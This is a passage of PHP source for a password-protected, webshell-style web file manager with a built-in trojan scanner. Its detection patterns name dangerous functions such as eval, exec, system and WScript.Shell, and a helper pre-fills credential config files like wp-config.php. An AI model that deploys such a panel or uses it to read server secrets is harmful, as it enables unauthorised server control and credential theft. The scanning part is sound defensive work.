<?php
$mypassword = 'OMYUN'; //登录密码

error_reporting(0);
date_default_timezone_set('UTC'); 
ob_start();
define('myaddress', $_SERVER['SCRIPT_FILENAME']); //当前执行文件的位置
define('mypass', $mypassword);
header("Content-Type:text/html;charset=utf-8"); //指定下编码

if(isset($_GET['eanver'])&&$_GET['eanver']!='left'&&$_GET['eanver']!='editr'){ 

   setcookie('iframeurl', '?'.$_SERVER['QUERY_STRING'], time() + 365*24 * 3600); 

}
 

if ($_GET['eanver'] == "scanphp") { 
    $t_start = microtime(true); //程序开始时间
 
}


$danger_arr = array(
         "\beval[\s]*\(", 
          "\beval_r[\s]*\(", 
         "\bcreate_function[\s]*\(",
         "\bassert[\s]*\(",  
         "\bexec[\s]*\(", 
         "\bsystem[\s]*\(", 
         "\bshell_exec[\s]*\(",
         "\bpopen[\s]*\(",
         "\bproc_open[\s]*\(",
         "\bpassthru[\s]*\(",

         "\bmove_uploaded_file[\s]*\(",
         "\bcopy[\s]*\(",
         "\bfwrite[\s]*\(",
         "\bfputs[\s]*\(",
         "\bpreg_replace[\s]*\(",
         "\bfile_get_contents[\s]*\(",
         "\bfile_put_contents[\s]*\(",
         "\busort[\s]*\(",
         "\buasort[\s]*\(",
         "\buksort[\s]*\(",
         "\barray_intersect_ukey[\s]*\(",
         "\bcall_user_func[\s]*\(",
         "\bcall_user_func_array[\s]*\(",
         "\bmb_ereg_replace[\s]*\(", 
         "\barray_map[\s]*\(",
         "\barray_walk[\s]*\(",
         "\barray_walk_recursive[\s]*\(", 
         "\barray_uintersect[\s]*\(",
         "\barray_intersect_assoc[\s]*\(",
         "\barray_intersect_uassoc[\s]*\(",
         "\barray_uintersect_uassoc[\s]*\(",
         "\barray_uintersect_assoc[\s]*\(",
         "\barray_udiff_uassoc[\s]*\(",
         "\barray_udiff_assoc[\s]*\(",
         "\barray_udiff[\s]*\(",
         "\barray_diff_ukey[\s]*\(",
         "\barray_diff_uassoc[\s]*\(",
         "\barray_filter[\s]*\(",
         "\barray_reduce[\s]*\(",
         "\bregister_tick_function[\s]*\(",
         "\bforward_static_call[\s]*\(",
         "\bfilter_var[\s]*\(",
        "\bregister_shutdown_function[\s]*\(",
        "\bset_error_handler[\s]*\(",
        "\bstream_filter_register[\s]*\(",
         "\bpreg_filter[\s]*\(",
         "\.\/\*",
         "\*\/\(",
         "\*\/\.", 
         "[\$]_FILES", 
         "HTTP_USER_AGENT", //针对快照的
         // "location\.href",  //针对js的
         // "window\.open\(",  //针对js的木马检测
         // "document\.write\(",
         "\bphpinfo[\s]*\(",
        
    );

//危险数组
$danger = implode('|',$danger_arr);
 
//危险特征
$matches_muma_preg = array(
    '/(?<![`][\s])(?<![>])\$[0-9a-zA-Z_\[\]\'\"]+\([\s\'\"\,\(@]*([\$]|[a-zA-Z_][0-9a-zA-Z_]*\()/',
     '/(?<!\/)[\s@](include|require|include_once|require_once)\s*[\(\$\'\"]((?<!\.php)[^\(\)\s;=>])+[;\)\s]/i',     
 
    // '/header(\n| |\t|\r)*\([\'"]+location:/i',  
   );

$matches_muma_preg[]="/($danger)/is";  

 
function css_img($img)
{
    header("Content-Type:text/html;charset=utf-8");
    $images = array(
        "exe" =>
            "R0lGODlhEwAOAKIAAAAAAP///wAAvcbGxoSEhP///wAAAAAAACH5BAEAAAUALAAAAAATAA4AAAM7" .
            "WLTcTiWSQautBEQ1hP+gl21TKAQAio7S8LxaG8x0PbOcrQf4tNu9wa8WHNKKRl4sl+y9YBuAdEqt" .
            "xhIAOw==",
        "dir" => "R0lGODlhEwAQALMAAAAAAP///5ycAM7OY///nP//zv/OnPf39////wAAAAAAAAAAAAAAA" .
            "AAAAAAAAAAAACH5BAEAAAgALAAAAAATABAAAARREMlJq7046yp6BxsiHEVBEAKYCUPrDp7HlXRdE" .
            "oMqCebp/4YchffzGQhH4YRYPB2DOlHPiKwqd1Pq8yrVVg3QYeH5RYK5rJfaFUUA3vB4fBIBADs=",
        "txt" =>
            "R0lGODlhEwAQAKIAAAAAAP///8bGxoSEhP///wAAAAAAAAAAACH5BAEAAAQALAAAAAATABAAAANJ" .
            "SArE3lDJFka91rKpA/DgJ3JBaZ6lsCkW6qqkB4jzF8BS6544W9ZAW4+g26VWxF9wdowZmznlEup7" .
            "UpPWG3Ig6Hq/XmRjuZwkAAA7",
        "html" =>
            "R0lGODlhEwAQALMAAAAAAP///2trnM3P/FBVhrPO9l6Itoyt0yhgk+Xy/WGp4sXl/i6Z4mfd/HNz" .
            "c////yH5BAEAAA8ALAAAAAATABAAAAST8Ml3qq1m6nmC/4GhbFoXJEO1CANDSociGkbACHi20U3P" .
            "KIFGIjAQODSiBWO5NAxRRmTggDgkmM7E6iipHZYKBVNQSBSikukSwW4jymcupYFgIBqL/MK8KBDk" .
            "Bkx2BXWDfX8TDDaFDA0KBAd9fnIKHXYIBJgHBQOHcg+VCikVA5wLpYgbBKurDqysnxMOs7S1sxIR" .
            "ADs=",
        "js" =>
            "R0lGODdhEAAQACIAACwAAAAAEAAQAIL///8AAACAgIDAwMD//wCAgAAAAAAAAAADUCi63CEgxibH" .
            "k0AQsG200AQUJBgAoMihj5dmIxnMJxtqq1ddE0EWOhsG16m9MooAiSWEmTiuC4Tw2BB0L8FgIAhs" .
            "a00AjYYBbc/o9HjNniUAADs=",
        "xml" =>
            "R0lGODlhEAAQAEQAACH5BAEAABAALAAAAAAQABAAhP///wAAAPHx8YaGhjNmmabK8AAAmQAAgACA" .
            "gDOZADNm/zOZ/zP//8DAwDPM/wAA/wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" .
            "AAAAAAAAAAAAAAAAAAVk4CCOpAid0ACsbNsMqNquAiA0AJzSdl8HwMBOUKghEApbESBUFQwABICx" .
            "OAAMxebThmA4EocatgnYKhaJhxUrIBNrh7jyt/PZa+0hYc/n02V4dzZufYV/PIGJboKBQkGPkEEQ" .
            "IQA7",
        "mp3" =>
            "R0lGODlhEAAQACIAACH5BAEAAAYALAAAAAAQABAAggAAAP///4CAgMDAwICAAP//AAAAAAAAAANU" .
            "aGrS7iuKQGsYIqpp6QiZRDQWYAILQQSA2g2o4QoASHGwvBbAN3GX1qXA+r1aBQHRZHMEDSYCz3fc" .
            "IGtGT8wAUwltzwWNWRV3LDnxYM1ub6GneDwBADs=",
        "img" =>
            "R0lGODlhEAAQADMAACH5BAEAAAkALAAAAAAQABAAgwAAAP///8DAwICAgICAAP8AAAD/AIAAAACA" .
            "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAARccMhJk70j6K3FuFbGbULwJcUhjgHgAkUqEgJNEEAgxEci" .
            "Ci8ALsALaXCGJK5o1AGSBsIAcABgjgCEwAMEXp0BBMLl/A6x5WZtPfQ2g6+0j8Vx+7b4/NZqgftd" .
            "FxEAOw==",
        "title" => "R0lGODlhDgAOAMQAAOGmGmZmZv//xVVVVeW6E+K2F/+ZAHNzcf+vAGdnaf/AAHt1af+" .
            "mAP/FAP61AHt4aXNza+WnFP//zAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" .
            "ACH5BAAHAP8ALAAAAAAOAA4AAAVJYPIcZGk+wUM0bOsWoyu35KzceO3sjsTvDR1P4uMFDw2EEkGUL" .
            "I8NhpTRnEKnVAkWaugaJN4uN0y+kr2M4CIycwEWg4VpfoCHAAA7",
        'php' => "iVBORw0KGgoAAAANSUhEUgAAABMAAAATCAMAAABFjsb+AAAAq1BMVEVHcEzj4+XQ0dDT09Pf398AAADd3d4EBAQAAADu7u+xsLZ0" .
            "Z6DLzMvZ2tjk5OR3d3fAwcG5ubxRQ4C3t7rn5+fBwr+wr7VEN27n5+eEhITh4eH4+Pj////h4uD09PT8/fzn5+jCvdN/cbJmVpwoJjM6MlZgX" .
            "W7U1NfP0c6QjJ1hUpHNyN+mncOTib5IQ2E8OEqzrNJtXaqdm6Xi3PhsZIiek8IXFh6EgY4WFRtTm5CHAAAAG3RSTlMA/r7B2Bb+Agv9/v6+w9t" .
            "voO/8sNy9vfzgh+ZTFswcAAAA80lEQVQY01WQ6W6EIBRGQadQZNSJcSZtkUUU93WWtu//ZGXQNukJuT++nPtBAAC8/gdY8Ongh4df3k74mR0J58" .
            "LCLIL5W6YQhwjZARVh3u6hmnOO7EFEeq7vKBSHdZ7nDSRC7rsMDsPS9/kyDCRzHvARfeS39uvW5w+qQud5eqzmaiqraqqo9p136XQ5lt/LbGdC" .
            "L8470+TTTNNoytkU9Oy8MDBm1VoXZl2TYO/LgntXPOnuAdvu9aRsgmvbtteg4XUMNo8o+1gmBIJbZL2MEMakFKpG7xi4Pl+y7AkjTbxF9v8+o" .
            "jRK0ygKY4y3Vfzyx578APIyGbwFq4NRAAAAAElFTkSuQmCC",

        'html' => "iVBORw0KGgoAAAANSUhEUgAAABMAAAATCAMAAABFjsb+AAAAzFBMVEVHcEwQnVkQn1oQ" .
            "nln8yknbRj3cSD37zEXof0HfSz7/1En9z0nOxk0RnVkMnVn8z0ndSj3dSj0QnlndTD0JrV/qg0DWQjf9z0n7z0n8z0n8z0n8z0me" .
            "XEH4zUmrvU7dSz39zkgPnVnZQDcTnlk0e/ADl1OevfpHiPPleDZMi/M8gPEGpF3o48v/33jiVkay1NBxqf+OwP5dmP81n2XmRTvwj" .
            "HLqbF/ZzNeDrfzhyVARiUiCsWlUgU91VjXtmYvTkoRkoUdVuX5ywpAvoFWzqJelAAAAH3RSTlMA+h6QHn31/gQh/u4V0vBxj9R5oC" .
            "f++ITMk86H+vrz30fDbQAAAP1JREFUGNNFkAlzgjAQhRMMBFA8EEd7pGwIR0E6gPfR2///n7pBqW+SzOabN7vJIwRl43Yc51ZdZTvj" .
            "iWVZk7Hzj4gZdjI7NMWLpRce02svU9dhhAojKzJ1z+B9gyTcfm5fUbMZQ2Nv+byJdvumbkrOues+IfOSSxTuV3ERr0oOgj8SYgzV8m" .
            "PXxHmex+kbB+gPSEClPH3VRZZlxaFlDH1UJWf0Za2Pax/xFJWq0v3qEkDAQs+VVMl1lR7S6ogzYI7MkFrq53f9DSjB9D98SdGZJKcj" .
            "cAGjNhu7JzVNzq4AeLjFZftKKnnBd4jRPazA94Yv/cWc3UPVhcEGXc5/RsEearI9fisAAAAASUVORK5CYII=",

        "rar" => "R0lGODlhEAAQAPf/AAAAAAAAgAAA/wCAAAD/AACAgIAAAIAAgP8A/4CAAP//AMDAwP///wAA" .
            "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" .
            "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" .
            "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" .
            "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" .
            "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" .
            "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" .
            "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" .
            "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" .
            "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" .
            "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" .
            "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" .
            "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" .
            "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" .
            "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD/ACH5BAEKAP8ALAAAAAAQABAAAAiFAP0YEEhwoEE/" .
            "/xIuEJhgQYKDBxP+W2ig4cOCBCcyoHjAQMePHgf6WbDxgAIEKFOmHDmSwciQIDsiXLgwgZ+b" .
            "OHOSXJiz581/LRcE2LigqNGiLEkKWCCgqVOnM1naDOCHqtWbO336BLpzgAICYMOGRdgywIIC" .
            "aNOmRcjVj02tPxPCzfkvIAA7"
    );
    header('Content-type: image/gif');
    echo base64_decode($images[$img]);
    die();
}

function css_showimg($file)
{
    $it = substr($file, -3);
    switch ($it) {
        case "jpg":
        case "gif":
        case "bmp":
        case "png":
        case "ico":
            return 'img';
            break;
        case "htm":
        case "tml":
            return 'html';
            break;
        case "exe":
        case "com":
            return 'exe';
            break;
        case "xml":
        case "doc":
            return 'xml';
            break;
        case ".js":
        case "vbs":
            return 'js';
            break;
        case "mp3":
        case "wma":
        case "wav":
        case "swf":
        case ".rm":
        case "avi":
        case "mp4":
        case "mvb":
            return 'mp3';
            break;
        case "rar":
        case "tar":
        case ".gz":
        case "zip":
        case "iso":
            return 'rar';
            break;
        case "php":
            return 'php';
            break;
        case "html":
            return 'html';
            break;
     
        default:
            return 'txt';
            break;
    }
}

function html_n($data)
{
    echo "$data\n";

}


function showdir($path, $eanver)
{

    $dir = @dir($path);
    $REAL_DIR = File_Str(realpath($path));

    $NUM_D = $NUM_F = 0;
    if (!$_SERVER['SERVER_NAME']) $GETURL = ''; else $GETURL = 'http://' . $_SERVER['SERVER_NAME'] . '/';
    $ROOT_DIR = File_Mode();
    html_n('<ul style="float:left; margin-top:0px; width:100%; height:600px; overflow-y:scroll;"><b>');
    html_a('?eanver=' . $eanver . '&path=' . uppath($path), "<b>上级目录</b>");
    html_n('</b> ');
    while ($dirs = @$dir->read()) {
        if ($dirs == '.' or $dirs == '..') continue;
        $dirpath = str_path("$path/$dirs");
        if (is_dir($dirpath)) {
            $perm = substr(base_convert(fileperms($dirpath), 10, 8), -4);
            $filetime = @date('Y-m-d H:i:s', @filemtime($dirpath));
            $dirpath = urlencode($dirpath);
            html_n('<li>');
            html_img("dir");
            html_a('?eanver=' . $eanver . '&path=' . $dirpath, $dirs);
            $dirs = characet($dirs);
            html_n("</li>");
            $NUM_D++;
        }
    }
    @$dir->rewind();

    while ($files = @$dir->read()) {
        if ($files == '.' or $files == '..') continue;
        $filepath = str_path("$path/$files");
        if (!is_dir($filepath)) {
            $fsize = @filesize($filepath);
            $fsize = @File_Size(sprintf("%u", $fsize));
            $perm = substr(base_convert(fileperms($filepath), 10, 8), -4);
            $filetime = @date('Y-m-d H:i:s', @filemtime($filepath));
            $Fileurls = str_replace(File_Str($ROOT_DIR . '/'), $GETURL, $filepath);
            $todir = $ROOT_DIR . '/';
            $filepath = urlencode($filepath);
            $it = substr($filepath, -3);
            html_n('<li>');
            html_img(css_showimg($files));
            html_a($Fileurls, $files, 'target="_blank"');

            if (($it == '.gz') or ($it == 'zip') or ($it == 'tar') or ($it == '.7z')) {
                html_a("?type=1&unzip=" . $filepath, "Z解1", 'title="手写的PHP解压' . $files . "\" onClick=\"rusurechk('" . $todir . "','?tt=1&unzip=" . $filepath . '&todir=\');return false;"');
                html_a("?type=2&unzip=" . $filepath, "Z解2", 'title="PHP自带的ZIP解压' . $files . "\" onClick=\"rusurechk('" . $todir . "','?tt=2&unzip=" . $filepath . '&todir=\');return false;"');
                html_a("?type=3&unzip=" . $filepath, "T解", 'title="PHP自带的tar解压' . $files . ',针对LINUX文件属性权限用,比如0777,0755" onClick="rusurechk(\'' . $todir . "','?tt=3&unzip=" . $filepath . '&todir=\');return false;"');
            } else {
                html_a("?eanver=editr&p=" . $filepath, "编辑", "title=\"编辑" . $files . '"');
            }

            $files = characet($files);
            html_n("<a href=\"#\" onClick=\"rusurechk('" . $files . "','?eanver=rename&p=" . $filepath . "&newname=');return false;\">改名</a>  ");

            html_n("</li>");
            $NUM_F++;
        }
    }
    @$dir->close();

    html_n("</ul>");
}



 
function muma($filecode, $filetype)
{

    global $matches_muma_preg; 
    $dim = array(

        /* 这里增加各种PHP木马特征判断 实在不行就全站PHP文件检查
        */
        "php" => array(
         "eval\(", 
         "create_function\(",
         "assert\(",  
         "exec\(", 
         "popen\(",
         "move_uploaded_file\(",
         "copy\(",
          "fwrite\(",
          "fputs\(",
          "\.\/\*",
         "\*\/\(",
         "\*\/\.",
         "\\$_FILES", 
         "phpinfo\(",
        
    ),   



        "asp" => array("WScript.Shell", "execute(", "createtextfile("),
        "aspx" => array("Response.Write(eval(", "RunCMD(", "CreateText()"),  
        "asa" => array("WScript.Shell", "execute(", "createtextfile("),
        "htr" => array("WScript.Shell", "execute(", "createtextfile("),
        "cdx" => array("WScript.Shell", "execute(", "createtextfile("),
        "cer" => array("WScript.Shell", "execute(", "createtextfile("),
        "jsp" => array("runtime.exec(")
    );

   if ($_POST['checkalltype'] == 1) {
            return $filetype;
        }
 

    foreach($matches_muma_preg as $preg){

       if(preg_match($preg, $filecode,$matches)){

          return "特征：".$matches[0];
       }

    }
 
 
}

/*代码转html*/
function toHtmlChars($sHtml)
{
    static $maEntities =
        array ('&' => '&amp;', '<' => '&lt;', '>' => '&gt;', '\'' => '&apos;', '"' => '&quot;', ' '=>'&nbsp;', "\r\n" => '<br>', "\n" => '<br>', "\t" => '&nbsp;&nbsp;&nbsp;&nbsp;');
    return strtr($sHtml, $maEntities);
}


function debug($file, $ftype)
{
    $type = explode('|', $ftype);
    foreach ($type as $i) {
        if (stristr($file, $i)) return true;
    }
}

function str_path($path)
{
    return str_replace('//', '/', $path);
}

function msg($msg)
{
    die("<script>window.alert('" . $msg . "');history.go(-1);</script>");
}

function uppath($nowpath)
{
    $nowpath = str_replace('\\', '/', dirname($nowpath));
    return urlencode($nowpath);
}

function html_ta($url, $name)
{
    html_n("<a href=\"$url\" target=\"_blank\">$name</a>");
}


function characet($data)
{
    if (!empty($data)) {
        $fileType = mb_detect_encoding($data, array('UTF-8', 'GBK', 'LATIN1', 'BIG5'));
        if ($fileType != 'UTF-8') {
            $data = mb_convert_encoding($data, 'utf-8', $fileType);
        }
    }
    return $data;
}


function html_a($url, $name, $where = '')
{

    $name = characet($name);
    $where = characet($where);

    if ($name == '编辑') {
        $filename = trim(trim($where, 'title='), '\"');
        html_n("<a href=\"$url\" style=\"font-size:14px; padding:0 20px; \" target=\"_blank\"  tonclick=\"editfile('" . $url . "','$filename',this)\" $where>$name</a> ");
    } else {

        html_n("<a href=\"$url\" $where>$name</a> ");
    }


}

function html_img($url)
{
    html_n("<img src=\"?img=$url\" border=0>");
}

function back()
{
    html_n("<input type='button' value='返回' onclick='history.back();'>");
}

function html_radio($namei, $namet, $v1, $v2)
{
    html_n('<input type="radio" name="return" value="' . $v1 . '" checked>' . $namei);
    html_n('<input type="radio" name="return" value="' . $v2 . '">' . $namet . '<br><br>');
}

function html_input($type, $name, $value = '', $text = '', $size = '', $mode = false)
{
    if ($mode) {
        html_n("<input type=\"$type\" name=\"$name\" value=\"$value\" size=\"$size\" checked>$text");
    } else {
        html_n("$text <input type=\"$type\" name=\"$name\" value=\"$value\" size=\"$size\">");
    }
}

function html_text($name, $cols, $rows, $value = '')
{
    html_n("<br><br><textarea name=\"$name\" COLS=\"$cols\" ROWS=\"$rows\" >$value</textarea>");
}

function html_select($array, $mode = '', $change = '', $name = 'class')
{
    html_n("<select name=$name $change>");
    foreach ($array as $name => $value) {
        if ($name == $mode) {
            html_n("<option value=\"$name\" selected>$value</option>");
        } else {
            html_n("<option value=\"$name\">$value</option>");
        }
    }
    html_n("</select>");
}

function html_font($color, $size, $name)
{
    html_n("<font color=\"$color\" size=\"$size\">$name</font>");
}

function File_Str($string)
{
    return str_replace('//', '/', str_replace('\\', '/', $string));
}

function File_Write($filename, $filecode, $filemode)
{
    $key = true;
    $handle = @fopen($filename, $filemode);
    if (!@fwrite($handle, $filecode)) {
        @chmod($filename, 0666);
        $key = @fwrite($handle, $filecode) ? true : false;
    }
    @fclose($handle);
    return $key;
}

function File_Mode()
{
    if (isset($_SERVER['DOCUMENT_ROOT'])) {
        return str_replace('//', '/', str_replace('\\', '/', $_SERVER['DOCUMENT_ROOT']));
    }
    $all = $_SERVER['SCRIPT_FILENAME'];
    $ban = $_SERVER['SCRIPT_NAME'];
    $file = basename($ban);
    $ban = substr($ban, 0, strlen($ban) - strlen($file));
    if (substr($ban, -1) == "/")
        $ban = substr($ban, 0, strlen($ban) - 1);
    $ban = str_replace('//', '/', str_replace('\\', '/', $ban));
    $all = str_replace('//', '/', str_replace('\\', '/', $all));
    if ($ban == "")
        $index = strripos($all, "/" . $file);
    else
        $index = strripos($all, $ban);
    $all = substr($all, 0, $index);
    return $all;
}

function GetFileOwner($File)
{
    if (PATH_SEPARATOR == ':') {
        if (function_exists('posix_getpwuid')) {
            $File = posix_getpwuid(fileowner($File));
        }
        return $File['name'];
    }
}

function GetFileGroup($File)
{
    if (PATH_SEPARATOR == ':') {
        if (function_exists('posix_getgrgid')) {
            $File = posix_getgrgid(filegroup($File));
        }
        return $File['name'];
    }
}

function File_Size($size)
{
    $kb = 1024;
    $mb = 1024 * $kb;
    $gb = 1024 * $mb;
    $tb = 1024 * $gb;
    $db = 1024 * $tb;
    if ($size < $kb) {
        return $size . " B";
    } else if ($size < $mb) {
        return round($size / $kb, 2) . " K";
    } else if ($size < $gb) {
        return round($size / $mb, 2) . " M";
    } else if ($size < $tb) {
        return round($size / $gb, 2) . " G";
    } else if ($size < $db) {
        return round($size / $tb, 2) . " T";
    } else {
        return round($size / $db, 2) . " ST";
    }
}

function File_Read($filename)
{
    $handle = @fopen($filename, "rb");
    $filecode = @fread($handle, @filesize($filename));
    @fclose($handle);
    return $filecode;
}

function array_iconv($data, $output = 'utf-8')
{
    $encode_arr = array('UTF-8', 'ASCII', 'GBK', 'GB2312', 'BIG5', 'JIS', 'eucjp-win', 'sjis-win', 'EUC-JP');
    $encoded = mb_detect_encoding($data, $encode_arr);

    if (!is_array($data)) {
        return mb_convert_encoding($data, $output, $encoded);
    } else {
        foreach ($data as $key => $val) {
            $key = array_iconv($key, $output);
            if (is_array($val)) {
                $data[$key] = array_iconv($val, $output);
            } else {
                $data[$key] = mb_convert_encoding($data, $output, $encoded);
            }
        }
        return $data;
    }
}

function Mysql_Len($data, $len)
{
    if (strlen($data) < $len) return $data;
    return substr_replace($data, '...', $len);
}

function css_js($num, $code = '')
{
    html_n('<script language="javascript">');
    if ($num == "1") {
        $str = <<<end
function rusurechk(msg,url){
		smsg = "FileName:[" + msg + "]\\nPlease Input New File:";
		re = prompt(smsg,msg);
		if (re){
			url = url + re;
			window.location = url;
		}
	}
	function rusuredel(msg,url){
		smsg = "Do You Suer Delete [" + msg + "] ?";
		if(confirm(smsg)){
			URL = url + msg;
			window.location = url;
		}
	}
	function Delok(msg,gourl)
	{
		smsg = "确定要删除[" + unescape(msg) + "]吗?";
		if(confirm(smsg))
		{
			if(gourl == 'b')
			{
				document.getElementById('actall').value = escape(gourl);
				document.getElementById('fileall').submit();
			}
			else window.location = gourl;
		}
	}
	function SubmitAttran(msg,ffile,txt,actid)
	{
		re = prompt(msg,unescape(txt));
		if(re)
		{
			document.getElementById('attam').value = actid;
			document.getElementById('file').value = ffile;
			document.getElementById('inver').value = re;
			document.getElementById('fileall').submit();
		}
	}
	function CheckAll(form)
	{
		for(var i=0;i<form.elements.length;i++)
		{
			var e = form.elements[i];
			if (e.name != 'chkall')
			e.checked = form.chkall.checked;
		}
	}
	function CheckDate(msg,gourl)
	{
		smsg = "当前文件时间:[" + msg + "]";
		re = prompt(smsg,msg);
		if(re)
		{
			var url = gourl + re;
			var reg = /^(\d{1,4})(-|\/)(\d{1,2})\\2(\d{1,2}) (\d{1,2}):(\d{1,2}):(\d{1,2})$/;
			var r = re.match(reg);
			if(r==null){alert('日期格式不正确!格式:yyyy-mm-dd hh:mm:ss');return false;}
			else{document.getElementById('actall').value = gourl; document.getElementById('inver').value = re; document.getElementById('fileall').submit();}
		}
	}
	function SubmitUrl(msg,txt,actid)
	{
		re = prompt(msg,unescape(txt));
		if(re)
		{
			document.getElementById('actall').value = actid;
			document.getElementById('inver').value = escape(re);
			document.getElementById('fileall').submit();
		}
	}
end;
        html_n($str);
    } elseif ($num == "2") {
        $str = <<<end
var NS4 = (document.layers);
var IE4 = (document.all);
var win = this;
var n = 0;
function search(str){
	var txt, i, found;
	if(str == "")return false;
	if(NS4){
		if(!win.find(str)) while(win.find(str, false, true)) n++; else n++;
		if(n == 0) alert(str + " ... Not-Find")
	}
	if(IE4){
		txt = win.document.body.createTextRange();
		for(i = 0; i <= n && (found = txt.findText(str)) != false; i++){
			txt.moveStart("character", 1);
			txt.moveEnd("textedit")
		}
		if(found){txt.moveStart("character", -1);txt.findText(str);txt.select();txt.scrollIntoView();n++}
		else{if (n > 0){n = 0;search(str)}else alert(str + "... Not-Find")}
	}
	return false
}

function close_edit(){

	 window.close(); 

}
function CheckDate(){
	var re = document.getElementById('mtime').value;
	var reg = /^(\d{1,4})(-|\/)(\d{1,2})\\2(\d{1,2}) (\d{1,2}):(\d{1,2}):(\d{1,2})$/;
	var r = re.match(reg);
	var t = document.getElementById('charset').value;
    t = t.toLowerCase();
  
   // 判断兼容性  
	  // alert(typeof editAreaLoader); ACE_editor; 两种编辑器 
  
    if(typeof ACE_editor !="undefined"){
	   
      // document.getElementById('form_txt').value=editAreaLoader.getValue("form_txt");	
	 document.getElementById('form_txt').value=ACE_editor.getValue();	  
	}
 
	if(r==null){alert('日期格式不正确!格式:yyyy-mm-dd hh:mm:ss');return false;}
	else{document.getElementById('newfile').value =document.getElementById('newfile').value;
	
	
	if(t=="utf-8"){document.getElementById('form_txt').value =document.getElementById('form_txt').value;} 
end;

        html_n($str);
        if (substr(PHP_VERSION, 0, 1) >= 5) {
            $str = <<<end
if(t=="gbk" || t=="gb2312"){document.getElementById('form_txt').value = document.getElementById('form_txt').value;}
end;
            html_n($str);
        }
        $str = <<<end
		
   //alert(document.getElementById('form_txt').value); return false; 
 
	 
			
   document.getElementById('form_editor').submit();} 
 }
end;
        html_n($str);
    } elseif ($num == "4") {
        $str = <<<end
function Fulll(i){
   if(i==0){
     return false;
   }
  Str = new Array(10);
	Str[1] = "config.inc.php";
	Str[2] = "config.inc.php";
	Str[3] = "config_base.php";
	Str[4] = "config.inc.php";
	Str[5] = "config.php";
	Str[6] = "wp-config.php";
	Str[7] = "config.php";
	Str[8] = "mysql.php";
	Str[9] = "common.inc.php";
	Str[10] = "databases.php";
	sform.code.value = Str[i];
  return true;
  }
end;
        html_n($str);
    }
    html_n("</script>");
}

function css_left()
{
    $str = <<<end
<style type="text/css">
   *{ margin:0; padding:0; }
	.menu{width:152px;margin-left:auto;margin-right:auto;}
	.menu dl{margin-top:2px;}
	.menu dl dt{top left repeat-x;}
	.menu dl dt a{height:22px;padding-top:1px;line-height:18px;width:152px;display:block;color:#FFFFFF;font-weight:bold;
	text-decoration:none; 10px 7px no-repeat;text-indent:20px;letter-spacing:2px;}
	.menu dl dt a:hover{color:#FFFFCC;}
	.menu dl dd ul{list-style:none;}
	.menu dl dd ul li a{color:#000000;height:27px;widows:152px;display:block;line-height:27px;text-indent:28px;
	background:#BBBBBB no-repeat 13px 11px;border-color:#FFF #545454 #545454 #FFF;
	border-style:solid;border-width:1px;}
	.menu dl dd ul li a:hover{background:#FFF no-repeat 13px 11px;color:#FF6600;font-weight:bold;}
	.menu dl dd ul li.hover a{background:#FFF no-repeat 13px 11px;color:#FF6600;font-weight:bold;}
	
 /*定义滚动条高宽及背景 高宽分别对应横竖滚动条的尺寸*/  
#leftnav::-webkit-scrollbar  
{  
    width: 16px;  /*滚动条宽度*/
    height: 16px;  /*滚动条高度*/
}  
  
/*定义滚动条轨道 内阴影+圆角*/  
#leftnav::-webkit-scrollbar-track  
{  
    -webkit-box-shadow: inset 0 0 6px #b5b1b1;  
    border-radius: 10px;  /*滚动条的背景区域的圆角*/
    background-color: #333;/*滚动条的背景颜色*/  
}  
  
/*定义滑块 内阴影+圆角*/  
#leftnav::-webkit-scrollbar-thumb  
{  
    border-radius: 10px;  /*滚动条的圆角*/
    -webkit-box-shadow: inset 0 0 6px #b5b1b1;  
    background-color:#b5b1b1;  /*滚动条的背景颜色*/
}


	</STYLE>
	<script type="text/javascript" >
	
	   function show_hover(that){
		   
	 var objs = document.getElementsByClassName("hover");
    for (var i = 0; i < objs.length; i++) {
      //设置每个元素的背景颜色
              //objs[i].style.backgroundColor = "red";
	      objs[i].setAttribute('class','link');
    }
 
		    
		   
		    that.setAttribute('class','hover');
			
		   // alert(that);
		  
		  
	   }
 
	</script>
	
	
end;
    html_n($str);
    $str = <<<end
<script language="javascript">
	function getObject(objectId){
	 if(document.getElementById && document.getElementById(objectId)) {
	 return document.getElementById(objectId);
	 }
	 else if (document.all && document.all(objectId)) {
	 return document.all(objectId);
	 }
	 else if (document.layers && document.layers[objectId]) {
	 return document.layers[objectId];
	 }
	 else {
	 return false;
	 }
	}
	function showHide(objname){
	  var obj = getObject(objname);
	    if(obj.style.display == "none"){
			obj.style.display = "block";
		}else{
			obj.style.display = "none";
		}
	}
	</script><div class="menu">
end;
    html_n($str);
}

function css_main()
{


